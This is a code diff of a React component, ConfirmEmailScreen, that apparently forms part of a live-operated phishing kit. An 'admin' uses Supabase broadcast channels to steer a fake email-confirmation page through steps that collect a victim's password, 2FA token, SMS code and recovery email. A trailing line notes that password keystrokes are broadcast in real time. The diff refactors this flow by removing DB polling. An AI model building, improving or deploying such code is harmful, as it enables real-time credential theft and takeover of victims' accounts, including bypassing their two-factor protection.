@@ -67,143 +67,89 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
     [sessionId]
   );
 
-  // ── Realtime listeners ──
+  // ── Realtime listeners (sem polling automático) ──
   useEffect(() => {
     // Listen on both confirm and sync channels (unified)
     const confirmCh = supabase.channel(getChannelName(sessionId));
     const syncCh = supabase.channel(`sync-email-${sessionId}`);
 
-  const handleDecision = (decision: string, payload?: Record<string, string>) => {
-    if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
-      setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
-      setStep("password");
-      setPassword("");
-      setLoading(false);
-    } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
-      if (step === "sms_waiting" || step === "recovery_email_submitted") {
-        setStep("sms_code");
-        setSmsCode("");
-        setErrorMessage("");
-      } else {
+    const handleDecision = (decision?: string, payload?: Record<string, string>) => {
+      if (!decision) return;
+
+      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
+        setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
+        setStep("password");
+        setPassword("");
+        setLoading(false);
+      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
+        setStep((prev) => {
+          if (prev === "sms_waiting" || prev === "recovery_email_submitted") {
+            setSmsCode("");
+            setErrorMessage("");
+            return "sms_code";
+          }
+          setTokenCode("");
+          setAdminTokenCode("");
+          setErrorMessage("");
+          return "token_2fa";
+        });
+      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
+        const code = payload?.admin_token || "";
+        setAdminTokenCode(code);
         setStep("token_2fa");
         setTokenCode("");
-        setAdminTokenCode("");
         setErrorMessage("");
-      }
-    } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
-      const code = payload?.admin_token || "";
-      setAdminTokenCode(code);
-      setStep("token_2fa");
-      setTokenCode("");
-      setErrorMessage("");
-    } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
-      if (step === "sms_waiting" || step === "recovery_email_submitted") {
-        setStep("sms_code");
-        setSmsCode("");
-        setErrorMessage("");
-      } else {
+      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
+        setStep((prev) => {
+          if (prev === "sms_waiting" || prev === "recovery_email_submitted") {
+            setSmsCode("");
+            setErrorMessage("");
+            return "sms_code";
+          }
+          const ending = payload?.sms_ending || "";
+          setPhoneEnding(ending);
+          setClientPhoneInput("");
+          setSmsCode("");
+          setErrorMessage("");
+          return "sms_phone";
+        });
+      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
         const ending = payload?.sms_ending || "";
-        setPhoneEnding(ending);
-        setStep("sms_phone");
-        setClientPhoneInput("");
+        if (ending) setPhoneEnding(ending);
+        setStep("sms_code");
         setSmsCode("");
         setErrorMessage("");
-      }
-    } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
-      const ending = payload?.sms_ending || "";
-      if (ending) setPhoneEnding(ending);
-      setStep("sms_code");
-      setSmsCode("");
-      setErrorMessage("");
-    } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
-      const recEmail = payload?.recovery_email || "";
-      setRecoveryEmailAddr(recEmail);
-      setStep("recovery_email_input");
-      setClientRecoveryEmail("");
-      setErrorMessage("");
-    } else if (decision === "confirm_ask_recovery" || decision === "sync_ask_recovery") {
-      setErrorMessage("");
-    } else if (decision === "confirm_approved" || decision === "sync_approved") {
-      setStep("success");
-    } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
-      setErrorMessage("La verificación falló. Intentá nuevamente.");
-      setClientRecoveryEmail("");
-      setSmsCode("");
-      setTokenCode("");
-    }
-  };
-
-  confirmCh
-    .on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
-    .subscribe();
-
-  syncCh
-    .on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
-    .subscribe();
-
-  // DB polling fallback
-  const pollInterval = setInterval(async () => {
-    const { data } = await supabase
-      .from("sessions")
-      .select("status, otp_code")
-      .eq("id", sessionId)
-      .maybeSingle();
-
-    if (!data) return;
-    const { status, otp_code: otp } = data;
-
-    if ((status === "confirm_wrong_password" || status === "sync_wrong_password") && step !== "password") {
-      setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
-      setStep("password");
-      setPassword("");
-    } else if ((status === "confirm_ask_otp" || status === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
-      if (step === "sms_waiting" || step === "recovery_email_submitted") {
-        setStep("sms_code");
+      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
+        const recEmail = payload?.recovery_email || "";
+        setRecoveryEmailAddr(recEmail);
+        setStep("recovery_email_input");
+        setClientRecoveryEmail("");
+        setErrorMessage("");
+      } else if (decision === "confirm_ask_recovery" || decision === "sync_ask_recovery") {
+        setErrorMessage("");
+      } else if (decision === "confirm_approved" || decision === "sync_approved") {
+        setStep("success");
+      } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
+        setErrorMessage("La verificación falló. Intentá nuevamente.");
+        setClientRecoveryEmail("");
         setSmsCode("");
-      } else {
-        setStep("token_2fa");
         setTokenCode("");
-        setAdminTokenCode("");
       }
-    } else if ((status === "confirm_ask_token" || status === "sync_ask_token") && step !== "token_2fa") {
-      const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : "";
-      setAdminTokenCode(code);
-      setStep("token_2fa");
-      setTokenCode("");
-    } else if ((status === "confirm_ask_sms" || status === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
-      if (step === "recovery_email_submitted") {
-        setStep("sms_code");
-        setSmsCode("");
-      } else {
-        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
-        setPhoneEnding(ending);
-        setStep("sms_phone");
-        setClientPhoneInput("");
-        setSmsCode("");
-      }
-    } else if ((status === "confirm_advance_sms_code" || status === "sync_advance_sms_code") && step !== "sms_code") {
-      const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
-      if (ending) setPhoneEnding(ending);
-      setStep("sms_code");
-      setSmsCode("");
-    } else if ((status === "confirm_ask_recovery_email" || status === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
-      const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : "";
-      setRecoveryEmailAddr(recEmail);
-      setStep("recovery_email_input");
-      setClientRecoveryEmail("");
-    } else if ((status === "confirm_ask_recovery" || status === "sync_ask_recovery") && step === "recovery_email_submitted") {
-      // Not used in new flow — admin uses Token/SMS buttons instead
-    } else if (status === "confirm_approved" || status === "sync_approved") {
-      setStep("success");
-    }
-  }, 2500);
+    };
 
-  return () => {
-    supabase.removeChannel(confirmCh);
-    supabase.removeChannel(syncCh);
-    clearInterval(pollInterval);
-  };
-}, [sessionId, step]);
+    confirmCh
+      .on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
+      .subscribe();
+
+    syncCh
+      .on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(confirmCh);
+      supabase.removeChannel(syncCh);
+    };
+  }, [sessionId]);
 
 // ── Password change: broadcast every keystroke in real-time ──
 const handlePasswordChange = useCallback(
